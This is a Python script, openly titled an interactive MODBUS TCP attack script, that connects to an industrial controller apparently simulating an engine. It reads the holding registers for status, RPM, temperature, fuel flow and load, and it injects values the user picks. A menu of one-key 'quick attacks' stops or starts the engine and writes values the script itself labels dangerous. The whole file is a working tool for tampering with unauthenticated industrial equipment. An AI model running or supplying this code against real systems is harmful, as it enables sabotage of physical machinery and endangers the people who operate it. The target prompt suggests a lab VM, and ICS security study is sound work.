#!/usr/bin/env python3
"""
Interactive MODBUS TCP Attack Script
Reads all registers first, then allows custom packet injection
"""

from pyModbusTCP.client import ModbusClient
import time
import socket
import sys
from datetime import datetime

class InteractiveModbusAttacker:
    def __init__(self):
        self.registers = {
            'status': 0,      # Engine status (0=stopped, 1=running)
            'rpm': 1,         # Engine RPM
            'temp': 2,        # Engine temperature
            'fuel_flow': 3,   # Fuel flow rate
            'load': 4         # Engine load
        }
        self.client = None
        
    def connect_to_target(self, target_ip, port=502):
        """Connect to MODBUS target"""
        print(f"\n{'='*60}")
        print(f"CONNECTING TO MODBUS TARGET")
        print(f"Target: {target_ip}:{port}")
        print(f"{'='*60}")
        
        self.client = ModbusClient(host=target_ip, port=port, auto_open=True, auto_close=True)
        
        if not self.client.open():
            print(f"❌ Failed to connect to {target_ip}:{port}")
            return False
        
        print(f"✅ Connected to MODBUS server at {target_ip}:{port}")
        return True
    
    def read_all_registers(self):
        """Read and display all engine registers"""
        print(f"\n{'='*60}")
        print(f"READING ALL ENGINE REGISTERS")
        print(f"{'='*60}")
        
        if not self.client:
            print("❌ Not connected to MODBUS server")
            return None
        
        engine_data = {}
        
        for reg_name, reg_addr in self.registers.items():
            try:
                value = self.client.read_holding_registers(reg_addr, 1)
                if value:
                    raw_value = value[0]
                    
                    # Convert special values
                    if reg_name == 'fuel_flow':
                        display_value = raw_value / 100.0
                    else:
                        display_value = raw_value
                    
                    engine_data[reg_name] = {
                        'raw': raw_value,
                        'display': display_value,
                        'register': reg_addr
                    }
                    
                    # Status indicators
                    if reg_name == 'status':
                        status_icon = "🟢 RUNNING" if raw_value == 1 else "🔴 STOPPED"
                        print(f"  {reg_name.upper()}: {raw_value} ({status_icon}) [Register {reg_addr}]")
                    else:
                        print(f"  {reg_name.upper()}: {display_value} [Register {reg_addr}]")
                else:
                    print(f"  ❌ {reg_name.upper()}: Failed to read [Register {reg_addr}]")
                    
            except Exception as e:
                print(f"  ❌ {reg_name.upper()}: Error - {e}")
        
        return engine_data
    
    def inject_custom_value(self, register_name, new_value):
        """Inject custom value to specific register"""
        if register_name not in self.registers:
            print(f"❌ Unknown register: {register_name}")
            print(f"Available registers: {list(self.registers.keys())}")
            return False
        
        reg_addr = self.registers[register_name]
        
        # Convert value for special registers
        if register_name == 'fuel_flow':
            write_value = int(new_value * 100)  # Convert to integer storage
        else:
            write_value = int(new_value)
        
        print(f"\n🚨 INJECTING CUSTOM VALUE")
        print(f"Register: {register_name} (Address: {reg_addr})")
        print(f"New Value: {new_value} (Raw: {write_value})")
        
        try:
            success = self.client.write_single_register(reg_addr, write_value)
            
            if success:
                print(f"✅ Successfully injected value!")
                
                # Verify the injection
                time.sleep(0.5)
                verify_value = self.client.read_holding_registers(reg_addr, 1)
                if verify_value:
                    print(f"✅ Verification: Register {reg_addr} = {verify_value[0]}")
                else:
                    print(f"❓ Verification failed")
                
                return True
            else:
                print(f"❌ Failed to inject value")
                return False
                
        except Exception as e:
            print(f"❌ Error during injection: {e}")
            return False
    
    def interactive_menu(self):
        """Interactive menu for custom attacks"""
        while True:
            print(f"\n{'='*60}")
            print(f"INTERACTIVE MODBUS ATTACK MENU")
            print(f"{'='*60}")
            print(f"1. Read all registers")
            print(f"2. Inject custom value")
            print(f"3. Quick attacks")
            print(f"4. Exit")
            print(f"{'='*60}")
            
            choice = input("Enter your choice (1-4): ").strip()
            
            if choice == "1":
                self.read_all_registers()
                
            elif choice == "2":
                self.custom_injection_menu()
                
            elif choice == "3":
                self.quick_attacks_menu()
                
            elif choice == "4":
                print("👋 Exiting...")
                break
                
            else:
                print("❌ Invalid choice. Please enter 1-4.")
    
    def custom_injection_menu(self):
        """Menu for custom value injection"""
        print(f"\n{'='*60}")
        print(f"CUSTOM VALUE INJECTION")
        print(f"{'='*60}")
        
        # Show available registers
        print("Available registers:")
        for i, (reg_name, reg_addr) in enumerate(self.registers.items(), 1):
            print(f"  {i}. {reg_name} (Address: {reg_addr})")
        
        try:
            reg_choice = input(f"\nSelect register (1-{len(self.registers)}) or name: ").strip()
            
            # Convert number to register name
            if reg_choice.isdigit():
                reg_index = int(reg_choice) - 1
                if 0 <= reg_index < len(self.registers):
                    register_name = list(self.registers.keys())[reg_index]
                else:
                    print("❌ Invalid register number")
                    return
            else:
                register_name = reg_choice.lower()
            
            if register_name not in self.registers:
                print(f"❌ Unknown register: {register_name}")
                return
            
            # Get new value
            new_value = input(f"Enter new value for {register_name}: ").strip()
            
            try:
                if register_name == 'fuel_flow':
                    value = float(new_value)
                else:
                    value = int(new_value)
                
                self.inject_custom_value(register_name, value)
                
            except ValueError:
                print("❌ Invalid value. Please enter a number.")
                
        except KeyboardInterrupt:
            print("\n⏹️ Cancelled")
    
    def quick_attacks_menu(self):
        """Menu for quick predefined attacks"""
        print(f"\n{'='*60}")
        print(f"QUICK ATTACKS")
        print(f"{'='*60}")
        print(f"1. Stop engine")
        print(f"2. Start engine")
        print(f"3. Set dangerous RPM (9999)")
        print(f"4. Set dangerous temperature (999)")
        print(f"5. Set dangerous fuel flow (9999)")
        print(f"6. Emergency shutdown (all dangerous values)")
        print(f"7. Back to main menu")
        
        choice = input("Enter attack choice (1-7): ").strip()
        
        if choice == "1":
            self.inject_custom_value('status', 0)
            print("🚨 Engine stop command sent!")
            
        elif choice == "2":
            self.inject_custom_value('status', 1)
            print("🚨 Engine start command sent!")
            
        elif choice == "3":
            self.inject_custom_value('rpm', 9999)
            print("🚨 Dangerous RPM value set!")
            
        elif choice == "4":
            self.inject_custom_value('temp', 999)
            print("🚨 Dangerous temperature value set!")
            
        elif choice == "5":
            self.inject_custom_value('fuel_flow', 9999)
            print("🚨 Dangerous fuel flow value set!")
            
        elif choice == "6":
            print("🚨 EMERGENCY SHUTDOWN - Setting all dangerous values...")
            self.inject_custom_value('status', 0)      # Stop engine
            time.sleep(0.5)
            self.inject_custom_value('rpm', 9999)     # Dangerous RPM
            time.sleep(0.5)
            self.inject_custom_value('temp', 999)     # Dangerous temperature
            time.sleep(0.5)
            self.inject_custom_value('fuel_flow', 9999) # Dangerous fuel flow
            time.sleep(0.5)
            self.inject_custom_value('load', 9999)    # Dangerous load
            print("💥 All dangerous values injected!")
            
        elif choice == "7":
            return
            
        else:
            print("❌ Invalid choice")
    
    def continuous_monitor(self, duration=30):
        """Monitor registers continuously"""
        print(f"\n{'='*60}")
        print(f"CONTINUOUS MONITORING")
        print(f"Duration: {duration} seconds")
        print(f"Press Ctrl+C to stop early")
        print(f"{'='*60}")
        
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                current_time = datetime.now().strftime('%H:%M:%S')
                print(f"\n[{current_time}] Current Register Values:")
                
                for reg_name, reg_addr in self.registers.items():
                    try:
                        value = self.client.read_holding_registers(reg_addr, 1)
                        if value:
                            if reg_name == 'fuel_flow':
                                display_value = value[0] / 100.0
                            else:
                                display_value = value[0]
                            
                            status_icon = "🟢" if reg_name == 'status' and value[0] == 1 else "🔴" if reg_name == 'status' and value[0] == 0 else "📊"
                            print(f"  {status_icon} {reg_name}: {display_value}")
                        else:
                            print(f"  ❌ {reg_name}: Failed to read")
                    except Exception as e:
                        print(f"  ❌ {reg_name}: Error - {e}")
                
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n⏹️ Monitoring stopped by user")
    
    def close_connection(self):
        """Close MODBUS connection"""
        if self.client:
            self.client.close()
            print("🔌 MODBUS connection closed")

def main():
    print(f"\n{'='*80}")
    print(f"🚨 INTERACTIVE MODBUS TCP ATTACK SCRIPT")
    print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*80}")
    
    # Get target IP
    target_ip = input("Enter Linux VM IP address: ").strip()
    if not target_ip:
        print("❌ No IP address provided")
        return
    
    # Create attacker instance
    attacker = InteractiveModbusAttacker()
    
    # Connect to target
    if not attacker.connect_to_target(target_ip):
        print("❌ Failed to connect. Exiting...")
        return
    
    try:
        # Initial register read
        print(f"\n📊 INITIAL REGISTER READ")
        attacker.read_all_registers()
        
        # Start interactive menu
        attacker.interactive_menu()
        
    except KeyboardInterrupt:
        print("\n⏹️ Interrupted by user")
    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        attacker.close_connection()
    
    print(f"\n{'='*80}")
    print(f"🏁 Attack session completed")
    print(f"{'='*80}")

if __name__ == "__main__":
    main() 